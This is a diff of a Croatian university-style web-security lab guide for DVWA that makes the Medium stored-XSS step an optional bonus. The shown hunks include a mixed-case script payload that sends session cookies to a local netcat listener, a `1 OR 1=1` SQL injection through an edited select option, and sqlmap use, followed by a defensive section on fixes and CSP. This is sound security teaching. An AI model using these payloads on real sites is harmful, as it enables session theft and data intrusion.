@@ -161,7 +161,7 @@ Kad se knjiga gostiju ponovno učita, pohranjeni script izvršava se u Firefoxu 
 **U izvještaj:** reflektirani XSS koji ispiše kolačić (screenshot) i pohranjeni XSS koji ga pošalje na tvoj `nc` (screenshot s vidljivim matičnim brojem).
 
 ### 1.3 Podigni razinu
-Medium dodaje filtre, ali svaki štiti samo od točnog uzorka koji je programer očekivao. Provjeri sva tri slučaja:
+Medium dodaje filtre, ali svaki štiti samo od točnog uzorka koji je programer očekivao. Koraci 1–3 su obavezni, a korak 4 je neobavezni bonus:
 
 1. Otvori **DVWA Security**, odaberi **Medium**, klikni **Submit**, pa se vrati u **SQL Injection**. Tekstno polje sada je padajući izbornik, a obrazac šalje vrijednost HTTP POST zahtjevom.
 2. Desni klik na padajući izbornik → **Inspect**. U označenom elementu `<select>` pronađi opciju poput `<option value="1">1</option>`, dvaput klikni njezin `value` i promijeni ga u `1 OR 1=1`. Vrati se na stranicu, odaberi uređenu opciju i klikni **Submit**.
@@ -179,7 +179,7 @@ Medium escapea navodnike, ali ovaj query stavlja ID u SQL bez navodnika. Numeri�
 
 Medium filtar uklanja samo točan tekst `<script>` pisan malim slovima. HTML tagovi ne razlikuju velika i mala slova, pa Firefox i dalje prepoznaje `<ScRiPt>` kao script element.
 
-4. Provjeri da je raniji `nc` zaustavljen. Otvori **XSS (Stored)**, klikni **Clear Guestbook** i potvrdi upit; time uklanjaš Low payload da ga ne zamijeniš za Medium bypass. Pokreni novi slušatelj s `nc -lvnp 8000`. Zatim desni klik na **Name** → **Inspect** i promijeni `maxlength="10"` u `200`. U **Message** upiši `Medium <MB>`, a u **Name** ovaj payload s miješanim slovima, ponovno zamijenivši `<MB>`:
+4. **Bonus (neobavezno).** Provjeri da je raniji `nc` zaustavljen. Otvori **XSS (Stored)**, klikni **Clear Guestbook** i potvrdi upit; time uklanjaš Low payload da ga ne zamijeniš za Medium bypass. Pokreni novi slušatelj s `nc -lvnp 8000`. Zatim desni klik na **Name** → **Inspect** i promijeni `maxlength="10"` u `200`. U **Message** upiši `Medium <MB>`, a u **Name** ovaj payload s miješanim slovima, ponovno zamijenivši `<MB>`:
 
 ```html
 <ScRiPt>fetch('//127.0.0.1:8000/?id=M<MB>&c='+encodeURIComponent(document.cookie))</ScRiPt>
@@ -188,14 +188,14 @@ Medium filtar uklanja samo točan tekst `<script>` pisan malim slovima. HTML tag
 Početni `//` preuzima HTTP protokol stranice i skraćuje payload. Slovo `M` ispred matičnog broja označava Medium test. Medium filtar za pohranjeni XSS uklanja sve tagove iz polja **Message**, ali u polju **Name** traži samo točan tekst `<script>` pisan malim slovima. Tag s miješanim slovima prolazi blacklistu i preglednik ga izvršava.
 
 > [!NOTE]
-> **Očekivano.** Reflektirani payload otvara alert s `security=medium`; pohranjeni payload stvara novi zahtjev u `nc` koji sadrži `id=M<MB>`, `security%3Dmedium` i `PHPSESSID%3D...`.
+> **Očekivano.** Reflektirani payload otvara alert s `security=medium`; ako si radio bonus, pohranjeni payload stvara novi zahtjev u `nc` koji sadrži `id=M<MB>`, `security%3Dmedium` i `PHPSESSID%3D...`.
 
 > [!TIP]
-> **Čest problem.** Izmjena `maxlength` vrijedi samo na trenutačnoj stranici. Ako je ponovno učitaš prije slanja, ponovi izmjenu. Za SQL injection prije klika na **Submit** odaberi opciju čiji si `value` promijenio.
+> **Čest problem.** Izmjena `maxlength` vrijedi samo na trenutačnoj stranici. Ako je ponovno učitaš prije slanja, ponovi izmjenu. Za SQL injection prije klika na **Submit** odaberi opciju čiji si `value` promijenio. U bonusu baza za **Name** sprema najviše 100 znakova, pa payload zalijepi točno, bez dodatnih razmaka; dulja vrijednost sruši DVWA s greškom `Data too long`.
 
 Medium nije uklonio ranjivost, nego je samo stavio nekoliko stringova na blacklistu. Promjena velikih/malih slova i drugo polje za unos zaobilaze te pretpostavke. Dio 2 popravlja samu granicu tako da isti unos ostane podatak.
 
-**U izvještaj:** screenshotovi rezultata Medium SQLi-ja i oba Medium XSS-a te 3–5 rečenica o tome što je svaki filtar pokušao blokirati i zašto je bypass uspio.
+**U izvještaj:** screenshotovi rezultata Medium SQLi-ja i Medium reflektiranog XSS-a (te pohranjenog XSS-a ako si radio bonus) i 3–5 rečenica o tome što je svaki filtar pokušao blokirati i zašto je bypass uspio.
 
 ## Dio 2 — Defenzivno: popravi kod · ~30 min
 
@@ -216,6 +216,7 @@ Razina **Impossible** u *Compare All Levels* je DVWA-ina vlastita ispravna verzi
 3 konkretne preporuke za siguran razvoj (parametrizirani upiti svugdje, kodiranje po kontekstu izlaza, CSP, najmanje ovlasti za DB korisnika).
 
 ### Za brze — bonus
+- Pohranjeni XSS na razini **Medium** (1.3, korak 4).
 - Automatiziraj 1.1 sa `sqlmap` (`-u` + kolačić sesije) i izvuci imena tablica.
 - Postavi minimalni CSP header koji bi zaustavio tvoj pohranjeni XSS i obrazloži zašto.
 
